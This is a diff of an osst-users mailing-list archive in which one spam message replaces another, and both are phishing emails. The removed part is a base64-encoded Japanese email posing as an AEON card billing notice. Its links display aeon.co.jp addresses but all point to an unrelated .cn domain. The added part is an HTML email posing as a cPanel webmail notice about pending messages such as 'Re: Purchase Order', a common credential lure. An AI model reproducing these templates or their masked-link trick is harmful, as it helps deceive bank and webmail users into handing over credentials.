-4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSBDQrjgZTnmbvpjLLmg4XloLEo5rCP5ZCN44CB5L2P5omA
-44CB6YCj57Wh5YWI44CB44Oh44O844Or44Ki44OJ44Os44K544Gq44GpKeOBq+WkieabtOOBjOOB
-lOOBluOBhOOBvuOBl+OBn+OCieOAgeaaruOCieOBl+OBruODnuODjeODvOOCteOCpOODiOOCiOOC
-iuOBiuaJi+e2muOBjeOCkuOBiumhmOOBhOOBhOOBn+OBl+OBvuOBmeOAgg0KDQriiarkvY/miYDl
-pInmm7TmiYvntprjgY3jga7jgYrpoZjjgYTiiasNCuOBiuW8lei2iuOBl+OBquOBqeOBp+S9j+aJ
-gOOBq+WkieabtOOBjOeUn+OBmOOBn+mam+OBq+OBr+OAgeOBiuaXqeOCgeOBq+S9j+aJgOWkieab
-tOOBruWxiuWHuuOCkuOBiumhmOOBhOOBhOOBn+OBl+OBvuOBmeOAguOBiuWxiuOBkeOBhOOBn+OB
-oOOBkeOBquOBhOWgtOWQiOOAgemDtemAgeOBq+OCiOOCi+mHjeimgeOBquOBiuefpeOCieOBm+OB
-jOWxiuOBi+OBquOBhOWgtOWQiOOCguOBguOCiuOBvuOBmeOBruOBp+OBlOazqOaEj+OBj+OBoOOB
-leOBhOOAgg0KDQrilrzjgqvjg7zjg4nnmbvpjLLlhoXlrrnnhafkvJrjg7vlpInmm7TjgavjgaTj
-gYTjgabjga/jgZPjgaHjgokNCmh0dHBzOi8vd3d3LmFlb24uY28uanAvaW5xdWlyeS9jaGFuZ2Uv
-DQoNCuKWvOODoeODvOODq+OCouODieODrOOCueOBruWkieabtOOBr+OBk+OBoeOCiSANCmh0dHBz
-Oi8vd3d3LmFlb24uY28uanAvYXBwL3NldHRpbmdzL3Byb2ZpbGUvDQoNCu+8ne+8ne+8ne+8ne+8
-ne+8ne+8ne+8ne+8nQ0K4pag44Kk44Kq44Oz44K544Kv44Ko44Ki44Oh44Oz44OQ44O8SUTjg7vj
-g5Hjgrnjg6/jg7zjg4njgpLjgYrlv5jjgozjga7loLTlkIgNCmh0dHBzOi8vd3d3LmFlb24uY28u
-anAvYXBwL3NlYXJjaF9pZF9wd19yZWlzc3VlLw0KDQrilqDjgYrllY/jgYTlkIjjgo/jgZvlhYgN
-Cmh0dHBzOi8vd3d3LmFlb24uY28uanAvaW5xdWlyeS8NCg0K77yd77yd77yd77yd77yd77yd77yd
-77yd77ydDQrjgZPjga7jg6Hjg7zjg6vjgqLjg4njg6zjgrlbIHN0YXRlbWVudEBlbWFpbC5hZW9u
-LmNvLmpwIF3jga/pgIHkv6HlsILnlKjjgqLjg4njg6zjgrnjga7jgZ/jgoHjgIHjgZTov5Tkv6Hj
-gYTjgZ/jgaDjgYTjgabjgoLjgZTnlKjku7bjga/mib/jgozjgb7jgZvjgpPjgIINCuW9k+ODoeOD
-vOODq+OBq+OBiuW/g+W9k+OBn+OCiuOBruOBquOBhOaWueOBr+OAgeWkp+WkieOBiuaJi+aVsOOC
-kuOBiuaOm+OBkeOBhOOBn+OBl+OBvuOBmeOBjOOAgeOBneOBruaXqOOCkuOBiuabuOOBjea3u+OB
-iOOBhOOBn+OBoOOBjeS4i+iomOOCouODieODrOOCueOBvuOBp+OBiumAgeOCiuOBj+OBoOOBleOB
-hOOAgg0KbmV0YnJhbmNoQGFlb24uY28uanANCg0K4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB
-DQrnmbrooYzvvJrmoKrlvI/kvJrnpL7jgqTjgqrjg7PpioDooYwNCmh0dHBzOi8vd3d3LmFlb25i
-YW5rLmNvLmpwLw0KDQrmpa3li5nlj5foqJfkvJrnpL7vvJrjgqTjgqrjg7Pjg5XjgqPjg4rjg7Pj
-grfjg6Pjg6vjgrXjg7zjg5PjgrnmoKrlvI/kvJrnpL4NCmh0dHBzOi8vd3d3LmFlb25maW5hbmNp
-YWwuY28uanAvDQoNCuOBk+OBruODoeODvOODq+OBq+aOsui8ieOBleOCjOOBn+WGheWuueOCkuio
-seWPr+OBquOBj+i7oui8ieOBmeOCi+OBk+OBqOOCkuemgeOBmOOBvuOBmeOAgg0K4pSB4pSB4pSB
-4pSB4pSB4pSB4pSB4pSB4pSB
-
-------=_NextPart_000_0E57_0185AB3C.10CDECF0
-Content-Type: text/html;
-	charset="utf-8"
-Content-Transfer-Encoding: base64
-
-PCFET0NUWVBFIEhUTUwgUFVCTElDICItLy9XM0MvL0RURCBIVE1MIDQuMCBUcmFuc2l0aW9uYWwv
-L0VOIj4NCjxIVE1MPjxIRUFEPg0KPE1FVEEgY29udGVudD0idGV4dC9odG1sOyBjaGFyc2V0PXV0
-Zi04IiBodHRwLWVxdWl2PUNvbnRlbnQtVHlwZT4NCjxNRVRBIG5hbWU9R0VORVJBVE9SIGNvbnRl
-bnQ9Ik1TSFRNTCAxMS4wMC4xMDU3MC4xMDAxIj48L0hFQUQ+DQo8Qk9EWT7jgYTjgaTjgoLjgqTj
-gqrjg7Pjg57jg7zjgq/jga7jgqvjg7zjg4njgpLjgZTliKnnlKjjgYTjgZ/jgaDjgY3jgIHjgYLj
-gorjgYzjgajjgYbjgZTjgZbjgYTjgb7jgZnjgII8QlI+5pys44Oh44O844Or44GvV2Vi5piO57Sw
-KOeSsOWig+Wuo+iogCnjgavjgZTnmbvpjLLjgYTjgZ/jgaDjgYTjgabjgYTjgovjgYrlrqLjgZXj
-gb7jgavjgYrpgIHjgorjgZfjgabjgYrjgorjgb7jgZnjgII8QlI+PEJSPjPmnIjjga7jgZToq4vm
-sYLpoY3jgYznorrlrprjgYTjgZ/jgZfjgb7jgZfjgZ/jgII8QlI+PEJSPuKUgeKUgeKUgeKUgeKU
-geKUgeKUgeKUgTxCUj7jgYrmlK/miZXjgYTjgavjgaTjgYTjgaY8QlI+4pSB4pSB4pSB4pSB4pSB
-4pSB4pSB4pSBPEJSPuOBlOWIqeeUqOOCq+ODvOODiSANCu+8miDjgqTjgqrjg7Pjgqvjg7zjg4nj
-grvjg6zjgq/jg4g8QlI+44GK5pSv5omV5pelIA0K77yaMjAyNOW5tDTmnIgzMOaXpTxCUj48QlI+
-5Y+j5bqn5q6L6auY44Gu44GU56K66KqN44O744GU5YWl6YeR44Gv44CB44GK5pSv5omV5pel44Gu
-5YmN5Za25qWt5pel44G+44Gn44Gr44GK6aGY44GE44GE44Gf44GX44G+44GZ44CCPEJSPuOBlOWI
-qeeUqOaYjue0sOOBr+OAgeOCouODl+ODquOAjOOCpOOCquODs+OCpuOCqeODrOODg+ODiOOAjeOB
-vuOBn+OBr+ODm+ODvOODoOODmuODvOOCuOOAjOaaruOCieOBl+OBruODnuODjeODvOOCteOCpOOD
-iOOAjeOBuOODreOCsOOCpOODs+OBhOOBn+OBoOOBjeOBlOeiuuiqjeOBj+OBoOOBleOBhOOAgjxC
-Uj48QlI+4pa844GU6KuL5rGC5piO57Sw44Gu44GU56K66KqN44Gv44GT44Gh44KJPEJSPjxBIA0K
-aHJlZj0iaHR0cHM6Ly9kemR6ZWlkLmNuIj5odHRwczovL3d3dy5hZW9uLmNvLmpwL2FwcC88L0E+
-PEJSPjxCUj7igLvjg6Hjg7zjg6vkvZzmiJDmmYLngrnjgafjga7oq4vmsYLnorrlrprpoY3jgavj
-garjgorjgb7jgZnjgILjgZTliKnnlKjnirbms4Hjgavjgojjgorlho3luqboq4vmsYLpoY3norrl
-rprjg6Hjg7zjg6vjgpLjgYrpgIHjgorjgZnjgovloLTlkIjjgYzjgZTjgZbjgYTjgb7jgZnjgII8
-QlI+4oC744GK5byV6JC95Y+j5bqn44Gu6Kit5a6a44GM5a6M5LqG44GX44Gm44GE44Gq44GE5aC0
-5ZCI44Gv44CB5pyI5pyr6aCD44Gr55m66YCB44GE44Gf44GX44G+44GZ44Kz44Oz44OT44OL44Gu
-5oyv6L6855So57SZ44Gn44Gu44GK5pSv5omV44GE44KS44GK6aGY44GE44GE44Gf44GX44G+44GZ
-44CC44GK5byV6JC95Y+j5bqn44Gu6Kit5a6a44GM5a6M5LqG44GX44Gf44GL44GU5LiN5piO44Gq
-5aC05ZCI44Gv5LiL6KiY44KI44KK44GU56K66KqN44GP44Gg44GV44GE44CCPEJSPjxBIA0KaHJl
-Zj0iaHR0cHM6Ly9kemR6ZWlkLmNuIj5odHRwczovL2ZhcS5hZW9uLmNvLmpwL2ZhcS9zaG93LzY2
-MD9zaXRlX2RvbWFpbj1kZWZhdWx0PC9BPjxCUj7igLvkuIDpg6jjgIHjgYrlvJXokL3ml6XjgYzn
-lbDjgarjgovjgqvjg7zjg4njgYzjgZTjgZbjgYTjgb7jgZnjgII8QlI+PEJSPuKUgeKUgeKUgeKU
-geKUgeKUgeKUgeKUgTxCUj5XQU9OIA0KUE9JTlTjgavjgaTjgYTjgaY8QlI+4pSB4pSB4pSB4pSB
-4pSB4pSB4pSB4pSBPEJSPuOCr+ODrOOCuOODg+ODiOODu+ODh+ODk+ODg+ODiOaJleOBhOOBp+OB
-n+OBvuOCi1dBT04gDQpQT0lOVOaVsOOBr+avjuaciDI15pel44Gr44OH44O844K/44GM5pu05paw
-44GV44KM44G+44GZ44CC44Ki44OX44Oq44CM44Kk44Kq44Oz44Km44Kp44Os44OD44OI44CN44G+
-44Gf44Gv44Ob44O844Og44Oa44O844K444CM5pqu44KJ44GX44Gu44Oe44ON44O844K144Kk44OI
-44CN44G444Ot44Kw44Kk44Oz44GE44Gf44Gg44GN44GU56K66KqN44GP44Gg44GV44GE44CCPEJS
-PihXQU9OIA0KUE9JTlTjgYzpgLLlkYjjgZXjgozjgarjgYTjgqvjg7zjg4njga/jgZTliKnnlKjj
-gYTjgZ/jgaDjgZHjgb7jgZvjgpMpPEJSPjxCUj7ilrzmmq7jgonjgZfjga7jg57jg43jg7zjgrXj
-gqTjg4jjga/jgZPjgaHjgok8QlI+PEEgDQpocmVmPSJodHRwczovL2R6ZHplaWQuY24iPmh0dHBz
-Oi8vd3d3LmFlb24uY28uanAvYXBwL3BvaW50LzwvQT48QlI+4pa8V0FPTiANClBPSU5U44Gu5L2/
-44GI44KL5bqX6IiX44O75L2/44GE5pa544Gr6Zai44GX44Gm44Gv44GT44Gh44KJPEJSPjxBIA0K
-aHJlZj0iaHR0cHM6Ly9kemR6ZWlkLmNuIj5odHRwczovL2ZhcS5hZW9uLmNvLmpwL2ZhcS9zaG93
-LzU2Mj9iYWNrPWZyb250JTJGY2F0ZWdvcnklM0FzaG93JmFtcDtjYXRlZ29yeV9pZD0xNjYmYW1w
-O3BhZ2U9MSZhbXA7c2l0ZV9kb21haW49ZGVmYXVsdCZhbXA7c29ydD1zb3J0X2FjY2VzcyZhbXA7
-c29ydF9vcmRlcj1kZXNjIA0KPC9BPjxCUj48QlI+4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSBPEJS
-PuOCouODl+ODquOChOODoeODvOODq+OBp+OBiuODiOOCr+OBquaDheWgseOBjOWPl+WPluOCjOOB
-vuOBme+8gTxCUj7ilIHilIHilIHilIHilIHilIHilIHilIE8QlI+44Kk44Kq44Oz44Kr44O844OJ
-5YWs5byP44Ki44OX44Oq44CM44Kk44Kq44Oz44Km44Kp44Os44OD44OI44CN44Gq44KJ44GU5Yip
-55So5piO57Sw44Gu56K66KqN44KE44Od44Kk44Oz44OI5Lqk5o+b44Gv44KC44Gh44KN44KT44CB
-5Lya5ZOh6ZmQ5a6a44Kv44O844Od44Oz44KC5Yip55So44Gn44GN5L6/5Yip44Gn44GK44OI44Kv
-4pmqPEJSPuKWvGlQaG9uZeOCkuOBiuaMgeOBoeOBruaWueOBr+OBk+OBoeOCiTxCUj48QSANCmhy
-ZWY9Imh0dHBzOi8vZHpkemVpZC5jbiI+aHR0cHM6Ly9pdHVuZXMuYXBwbGUuY29tL2pwL2FwcC9h
-ZW9uLXdhbGxldC9pZDExMDA1NjQ4NDI/bD1qYSZhbXA7bHM9MSZhbXA7bXQ9ODwvQT48QlI+4pa8
-QW5kcm9pZOOCueODnuODm+OCkuOBiuaMgeOBoeOBruaWueOBr+OBk+OBoeOCiTxCUj48QSANCmhy
-ZWY9Imh0dHBzOi8vZHpkemVpZC5jbiI+aHR0cHM6Ly9wbGF5Lmdvb2dsZS5jb20vc3RvcmUvYXBw
-cy9kZXRhaWxzP2lkPWpwLmNvLmFlb24uY3JlZGl0LmFuZHJvaWQud2FsbGV0PC9BPjxCUj48QlI+
-4pa844Kk44Kq44Oz44Gq44Gp44Gn44Gu44GK6LK344GE54mp5oOF5aCx44KE44Kr44O844OJ44Kt
-44Oj44Oz44Oa44O844Oz5oOF5aCx44KC44GE44Gh5pep44GP44GK5bGK44GR77yB44Oh44O844Or
-44Oe44Ks44K444Oz44Gu44GU55m76Yyy44Gv44GT44Gh44KJPEJSPjxBIA0KaHJlZj0iaHR0cHM6
-Ly9kemR6ZWlkLmNuIj5odHRwczovL3d3dy5hZW9uLmNvLmpwL3NlcnZpY2UvbmV3c2xldHRlci88
-L0E+PEJSPuKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgTxCUj7jgYrlrqLjgZXjgb7mg4XloLHjga7m
-nIDmlrDljJbjgavjgaTjgYTjgaY8QlI+4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSBPEJSPuOBlOeZ
-u+mMsuaDheWgsSjmsI/lkI3jgIHkvY/miYDjgIHpgKPntaHlhYjjgIHjg6Hjg7zjg6vjgqLjg4nj
-g6zjgrnjgarjgakp44Gr5aSJ5pu044GM44GU44GW44GE44G+44GX44Gf44KJ44CB5pqu44KJ44GX
-44Gu44Oe44ON44O844K144Kk44OI44KI44KK44GK5omL57aa44GN44KS44GK6aGY44GE44GE44Gf
-44GX44G+44GZ44CCPEJSPjxCUj7iiarkvY/miYDlpInmm7TmiYvntprjgY3jga7jgYrpoZjjgYTi
-ias8QlI+44GK5byV6LaK44GX44Gq44Gp44Gn5L2P5omA44Gr5aSJ5pu044GM55Sf44GY44Gf6Zqb
-44Gr44Gv44CB44GK5pep44KB44Gr5L2P5omA5aSJ5pu044Gu5bGK5Ye644KS44GK6aGY44GE44GE
-44Gf44GX44G+44GZ44CC44GK5bGK44GR44GE44Gf44Gg44GR44Gq44GE5aC05ZCI44CB6YO16YCB
-44Gr44KI44KL6YeN6KaB44Gq44GK55+l44KJ44Gb44GM5bGK44GL44Gq44GE5aC05ZCI44KC44GC
-44KK44G+44GZ44Gu44Gn44GU5rOo5oSP44GP44Gg44GV44GE44CCPEJSPjxCUj7ilrzjgqvjg7zj
-g4nnmbvpjLLlhoXlrrnnhafkvJrjg7vlpInmm7TjgavjgaTjgYTjgabjga/jgZPjgaHjgok8QlI+
-PEEgDQpocmVmPSJodHRwczovL2R6ZHplaWQuY24iPmh0dHBzOi8vd3d3LmFlb24uY28uanAvaW5x
-dWlyeS9jaGFuZ2UvPC9BPjxCUj48QlI+4pa844Oh44O844Or44Ki44OJ44Os44K544Gu5aSJ5pu0
-44Gv44GT44Gh44KJIA0KPEJSPjxBIA0KaHJlZj0iaHR0cHM6Ly9kemR6ZWlkLmNuIj5odHRwczov
-L3d3dy5hZW9uLmNvLmpwL2FwcC9zZXR0aW5ncy9wcm9maWxlLzwvQT48QlI+PEJSPu+8ne+8ne+8
-ne+8ne+8ne+8ne+8ne+8ne+8nTxCUj7ilqDjgqTjgqrjg7Pjgrnjgq/jgqjjgqLjg6Hjg7Pjg5Dj
-g7xJROODu+ODkeOCueODr+ODvOODieOCkuOBiuW/mOOCjOOBruWgtOWQiDxCUj48RU0+PEEgDQpo
-cmVmPSJodHRwczovL2R6ZHplaWQuY24iPmh0dHBzOi8vd3d3LmFlb24uY28uanAvYXBwL3NlYXJj
-aF9pZF9wd19yZWlzc3VlLzwvQT48L0VNPjxCUj48QlI+4pag44GK5ZWP44GE5ZCI44KP44Gb5YWI
-PEJSPjxBIA0KaHJlZj0iaHR0cHM6Ly9kemR6ZWlkLmNuIj5odHRwczovL3d3dy5hZW9uLmNvLmpw
-L2lucXVpcnkvPC9BPjxCUj48QlI+77yd77yd77yd77yd77yd77yd77yd77yd77ydPEJSPuOBk+OB
-ruODoeODvOODq+OCouODieODrOOCuVsgDQpzdGF0ZW1lbnRAZW1haWwuYWVvbi5jby5qcCANCl3j
-ga/pgIHkv6HlsILnlKjjgqLjg4njg6zjgrnjga7jgZ/jgoHjgIHjgZTov5Tkv6HjgYTjgZ/jgaDj
-gYTjgabjgoLjgZTnlKjku7bjga/mib/jgozjgb7jgZvjgpPjgII8QlI+5b2T44Oh44O844Or44Gr
-44GK5b+D5b2T44Gf44KK44Gu44Gq44GE5pa544Gv44CB5aSn5aSJ44GK5omL5pWw44KS44GK5o6b
-44GR44GE44Gf44GX44G+44GZ44GM44CB44Gd44Gu5peo44KS44GK5pu444GN5re744GI44GE44Gf
-44Gg44GN5LiL6KiY44Ki44OJ44Os44K544G+44Gn44GK6YCB44KK44GP44Gg44GV44GE44CCPEJS
-Pm5ldGJyYW5jaEBhZW9uLmNvLmpwPEJSPjxCUj7ilIHilIHilIHilIHilIHilIHilIHilIHilIE8
-QlI+55m66KGM77ya5qCq5byP5Lya56S+44Kk44Kq44Oz6YqA6KGMPEJSPmh0dHBzOi8vd3d3LmFl
-b25iYW5rLmNvLmpwLzxCUj48QlI+5qWt5YuZ5Y+X6KiX5Lya56S+77ya44Kk44Kq44Oz44OV44Kj
-44OK44Oz44K344Oj44Or44K144O844OT44K55qCq5byP5Lya56S+PEJSPmh0dHBzOi8vd3d3LmFl
-b25maW5hbmNpYWwuY28uanAvPEJSPjxCUj7jgZPjga7jg6Hjg7zjg6vjgavmjrLovInjgZXjgozj
-gZ/lhoXlrrnjgpLoqLHlj6/jgarjgY/ou6LovInjgZnjgovjgZPjgajjgpLnpoHjgZjjgb7jgZnj
-gII8QlI+4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSBPEJSPjwvQk9EWT48L0hUTUw+DQo=
-
-------=_NextPart_000_0E57_0185AB3C.10CDECF0--
+Re: Purchase Order</span></td>
+<td style=3D"padding: 5px; width: 237px; border-top-color: rgb(170, 170, 17=
+0); border-right-color: rgb(170, 170, 170); border-left-color: rgb(170, 170=
+, 170); border-top-width: 1px; border-right-width: 1px; border-left-width: =
+1px; border-top-style: solid; border-right-style: solid; border-left-style:=
+ solid; white-space: nowrap; -ms-word-break: normal;"><span><span><span><sp=
+an><span><strong>(26 April</strong><strong>&nbsp;2024)</strong></span></spa=
+n></span></span></span></td></tr>
+<tr valign=3D"top">
+<td style=3D"padding: 5px; width: 188px; border-top-color: rgb(170, 170, 17=
+0); border-left-color: rgb(170, 170, 170); border-top-width: 1px; border-le=
+ft-width: 1px; border-top-style: solid; border-left-style: solid; white-spa=
+ce: nowrap; -ms-word-break: normal;">
+Deliver</td>
+<td style=3D"padding: 5px; width: 229px; border-top-color: rgb(170, 170, 17=
+0); border-left-color: rgb(170, 170, 170); border-top-width: 1px; border-le=
+ft-width: 1px; border-top-style: solid; border-left-style: solid; -ms-word-=
+break: normal;">&nbsp; osst-users@lists.sourceforge.net&nbsp;&nbsp;</td>
+<td style=3D"padding: 5px; width: 215px; border-top-color: rgb(170, 170, 17=
+0); border-left-color: rgb(170, 170, 170); border-top-width: 1px; border-le=
+ft-width: 1px; border-top-style: solid; border-left-style: solid; -ms-word-=
+break: normal;"><strong>
+</strong><font color=3D"#1560bd">Re: Proforma invoice</font></td>
+<td style=3D"padding: 5px; width: 237px; border-top-color: rgb(170, 170, 17=
+0); border-right-color: rgb(170, 170, 170); border-left-color: rgb(170, 170=
+, 170); border-top-width: 1px; border-right-width: 1px; border-left-width: =
+1px; border-top-style: solid; border-right-style: solid; border-left-style:=
+ solid; white-space: nowrap; -ms-word-break: normal;"><span><span><span><st=
+rong>(26 April</strong><strong>&nbsp;2024)</strong></span></span></span></t=
+d></tr>
+<tr valign=3D"top">
+<td style=3D"padding: 5px; width: 188px; border-top-color: rgb(170, 170, 17=
+0); border-left-color: rgb(170, 170, 170); border-top-width: 1px; border-le=
+ft-width: 1px; border-top-style: solid; border-left-style: solid; white-spa=
+ce: nowrap; -ms-word-break: normal;">
+Deliver</td>
+<td style=3D"padding: 5px; width: 229px; border-top-color: rgb(170, 170, 17=
+0); border-left-color: rgb(170, 170, 170); border-top-width: 1px; border-le=
+ft-width: 1px; border-top-style: solid; border-left-style: solid; -ms-word-=
+break: normal;">&nbsp; osst-users@lists.sourceforge.net&nbsp;&nbsp;</td>
+<td style=3D"padding: 5px; width: 215px; border-top-color: rgb(170, 170, 17=
+0); border-left-color: rgb(170, 170, 170); border-top-width: 1px; border-le=
+ft-width: 1px; border-top-style: solid; border-left-style: solid; -ms-word-=
+break: normal;"><span style=3D"color: rgb(95, 158, 160);">
+<span style=3D"color: rgb(0, 71, 171);"><strong><u>
+</u></strong><font color=3D"#1560bd">Re: Payment copy</font></span></span><=
+/td>
+<td style=3D"padding: 5px; width: 237px; border-top-color: rgb(170, 170, 17=
+0); border-right-color: rgb(170, 170, 170); border-left-color: rgb(170, 170=
+, 170); border-top-width: 1px; border-right-width: 1px; border-left-width: =
+1px; border-top-style: solid; border-right-style: solid; border-left-style:=
+ solid; white-space: nowrap; -ms-word-break: normal;"><span><span><span><st=
+rong>(26 April</strong><strong>&nbsp;2024)</strong></span></span></span></t=
+d></tr></tbody></table></div>
+<div style=3D"margin: 0px; padding: 0px; border-top-width: 0px; display: in=
+line;"><span style=3D"color: rgb(255, 0, 0); font-family: arial; font-size:=
+ 12px; font-weight: bolder;">
+<span style=3D"color: rgb(34, 34, 34);"><br style=3D"font-family: arial, he=
+lvetica, sans-serif;">&nbsp;</span></span></div>
+&nbsp;&nbsp;<span style=3D"color: rgb(255, 0, 0); font-family: arial; font-=
+size: 12px; font-weight: bolder;"><span style=3D"color: rgb(85, 85, 85);"><=
+span>&nbsp;</span>Note : This message was sent by&nbsp;</span>
+&nbsp;<span style=3D"color: rgb(192, 64, 0);">cPanel</span><span style=3D"c=
+olor: rgb(85, 85, 85);">&nbsp;notification only.</span>&nbsp;Please do not =
+reply<br>
+<br style=3D'color: rgb(51, 51, 51); font-family: "times new roman"; font-s=
+ize: medium;'>Regards<br>
+lists.sourceforge.net&nbsp;<span style=3D"color: rgb(192, 64, 0);">&nbsp;we=
+bmail</span>&nbsp;Team</span></div>
+<div style=3D"color: rgb(44, 54, 58); font-family: Arial, sans-serif;"><spa=
+n style=3D"color: rgb(255, 0, 0); font-family: arial; font-size: 12px; font=
+-weight: bolder;">
+<span style=3D'color: rgb(51, 51, 51); font-family: "lucida grande", verdan=
+a, arial, helvetica, sans-serif; font-size: 11px;'>&#9400; 2023&nbsp;<span =
+style=3D"font-weight: bolder;">
+&nbsp;<span style=3D"color: rgb(192, 64, 0); font-family: arial; font-size:=
+ 16px;">cPanel</span></span><span>&nbsp;</span>&nbsp;&nbsp;<span style=3D"c=
+olor: rgb(77, 81, 86); font-family: arial, sans-serif; font-size: 14px; fon=
+t-weight: 400;">
+<span style=3D"color: rgb(192, 64, 0); font-size: 11px;">&reg;</span></span=
+>&nbsp;&nbsp;. All Rights Reserved.</span></span></div></div></div></div></=
+div></div></div></div></div></div></body></html>
 
 
-
---===============3427152645227997998==
+--===============5982488253107879440==
 Content-Type: text/plain; charset="us-ascii"
 MIME-Version: 1.0
 Content-Transfer-Encoding: 7bit
 Content-Disposition: inline
 
 
---===============3427152645227997998==
+--===============5982488253107879440==
 Content-Type: text/plain; charset="us-ascii"
 MIME-Version: 1.0
 Content-Transfer-Encoding: 7bit
@@ -330,6 +363,4 @@ Osst-users mailing list
 Osst-users@lists.sourceforge.net
 https://lists.sourceforge.net/lists/listinfo/osst-users
 
---===============3427152645227997998==--
-
-
+--===============5982488253107879440==--
